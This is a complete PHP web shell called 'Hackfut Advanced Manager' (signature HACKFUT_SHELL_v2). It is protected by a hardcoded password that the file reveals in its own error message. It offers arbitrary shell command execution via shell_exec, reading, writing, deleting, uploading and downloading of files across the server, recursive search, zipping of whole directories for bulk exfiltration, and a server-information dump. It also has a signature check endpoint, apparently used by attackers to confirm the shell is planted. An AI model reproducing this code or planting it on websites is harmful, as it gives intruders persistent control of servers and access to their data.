<?php
// Hackfut Advanced Manager - Complete File Manager
// Signature: HACKFUT_SHELL_v2
error_reporting(0);
session_start();

// Configuration
$auth_password = "hackfut2024";
$upload_dir = "uploads/";
$temp_dir = "temp/";

// Simple authentication
if(isset($_GET['auth']) && $_GET['auth'] == $auth_password) {
    $_SESSION['logged'] = true;
}
if(!isset($_SESSION['logged']) || $_SESSION['logged'] !== true) {
    die("Authentication required. Use ?auth=" . $auth_password);
}

$action = isset($_GET['act']) ? $_GET['act'] : '';
$file = isset($_GET['file']) ? $_GET['file'] : '';

// Create directories if not exist
if(!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
if(!is_dir($temp_dir)) mkdir($temp_dir, 0777, true);

function json_response($data, $status=true) {
    header('Content-Type: application/json');
    echo json_encode(['status'=>$status, 'data'=>$data]);
    exit;
}

if($action == 'list') {
    $dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
    $files = scandir($dir);
    $result = [];
    foreach($files as $file) {
        if($file != '.' && $file != '..') {
            $path = $dir . '/' . $file;
            $result[] = [
                'name' => $file,
                'type' => is_dir($path) ? 'dir' : 'file',
                'size' => is_file($path) ? filesize($path) : 0,
                'perm' => substr(sprintf('%o', fileperms($path)), -4),
                'mtime' => date('Y-m-d H:i:s', filemtime($path))
            ];
        }
    }
    json_response($result);
}
elseif($action == 'read') {
    if($file && file_exists($file) && is_file($file)) {
        header('Content-Type: text/plain');
        echo file_get_contents($file);
    } else {
        json_response('File not found', false);
    }
}
elseif($action == 'write') {
    $content = isset($_POST['content']) ? $_POST['content'] : '';
    if($file && $content) {
        if(file_put_contents($file, $content)) {
            json_response('File written successfully');
        } else {
            json_response('Write failed', false);
        }
    }
}
elseif($action == 'delete') {
    if($file && file_exists($file)) {
        if(is_dir($file)) {
            rmdir($file);
        } else {
            unlink($file);
        }
        json_response('Deleted successfully');
    }
}
elseif($action == 'upload') {
    if(isset($_FILES['file'])) {
        $target = isset($_GET['target']) ? $_GET['target'] : $upload_dir;
        if(!is_dir($target)) mkdir($target, 0777, true);
        $target_file = $target . '/' . basename($_FILES['file']['name']);
        if(move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
            json_response(['path'=>$target_file, 'size'=>filesize($target_file)]);
        } else {
            json_response('Upload failed', false);
        }
    }
}
elseif($action == 'command') {
    $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
    if($cmd) {
        $output = shell_exec($cmd . ' 2>&1');
        json_response($output);
    }
}
elseif($action == 'info') {
    $info = [
        'php_version' => phpversion(),
        'server_ip' => $_SERVER['SERVER_ADDR'],
        'document_root' => $_SERVER['DOCUMENT_ROOT'],
        'current_dir' => getcwd(),
        'server_software' => $_SERVER['SERVER_SOFTWARE'],
        'os' => php_uname(),
        'safe_mode' => ini_get('safe_mode'),
        'disable_functions' => ini_get('disable_functions'),
        'upload_max_filesize' => ini_get('upload_max_filesize'),
        'post_max_size' => ini_get('post_max_size'),
        'signature' => 'HACKFUT_SHELL_v2'
    ];
    json_response($info);
}
elseif($action == 'check') {
    json_response(['signature' => 'HACKFUT_SHELL_v2', 'message' => 'Hackfut Advanced Manager']);
}
elseif($action == 'download') {
    if($file && file_exists($file) && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}
elseif($action == 'search') {
    $pattern = isset($_GET['pattern']) ? $_GET['pattern'] : '';
    $dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
    if($pattern) {
        $results = [];
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
        foreach($files as $file) {
            if(strpos($file->getFilename(), $pattern) !== false) {
                $results[] = $file->getPathname();
            }
        }
        json_response($results);
    }
}
elseif($action == 'zip') {
    $target = isset($_GET['target']) ? $_GET['target'] : '';
    $zipname = isset($_GET['zipname']) ? $_GET['zipname'] : 'archive.zip';
    if($target && file_exists($target)) {
        $zip = new ZipArchive();
        if($zip->open($zipname, ZipArchive::CREATE) === TRUE) {
            if(is_dir($target)) {
                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target));
                foreach($files as $file) {
                    if(!$file->isDir()) {
                        $zip->addFile($file->getPathname(), str_replace($target.'/', '', $file->getPathname()));
                    }
                }
            } else {
                $zip->addFile($target, basename($target));
            }
            $zip->close();
            json_response(['file'=>$zipname, 'size'=>filesize($zipname)]);
        }
    }
}
else {
    echo "<!DOCTYPE html>
    <html>
    <head>
        <title>Hackfut Advanced Manager</title>
        <style>
            body { font-family: monospace; background: #1e1e1e; color: #fff; padding: 20px; }
            .container { max-width: 1200px; margin: 0 auto; }
            h1 { color: #4caf50; }
            .cmd { background: #2d2d2d; padding: 10px; border-radius: 5px; }
            input, button { background: #3c3c3c; border: 1px solid #555; color: #fff; padding: 8px; margin: 5px; }
            button { cursor: pointer; background: #4caf50; }
            button:hover { background: #45a049; }
            pre { background: #2d2d2d; padding: 10px; overflow: auto; }
        </style>
    </head>
    <body>
        <div class='container'>
            <h1>🔧 Hackfut Advanced Manager</h1>
            <p>Signature: HACKFUT_SHELL_v2</p>
            <p>Actions: list, read, write, delete, upload, command, info, download, search, zip, check</p>
            <div class='cmd'>
                <form method='post' action='?act=command'>
                    <input type='text' name='cmd' placeholder='Enter command...' size='50'>
                    <button type='submit'>Execute</button>
                </form>
            </div>
            <div class='cmd'>
                <form method='post' action='?act=upload' enctype='multipart/form-data'>
                    <input type='file' name='file'>
                    <input type='text' name='target' placeholder='Target directory...' value='uploads/'>
                    <button type='submit'>Upload</button>
                </form>
            </div>
            <pre id='output'>Use ?act=list to see files</pre>
        </div>
        <script>
            fetch('?act=info').then(r=>r.json()).then(d=>{
                if(d.status) document.getElementById('output').innerText = JSON.stringify(d.data, null, 2);
            });
        </script>
    </body>
    </html>";
}
?>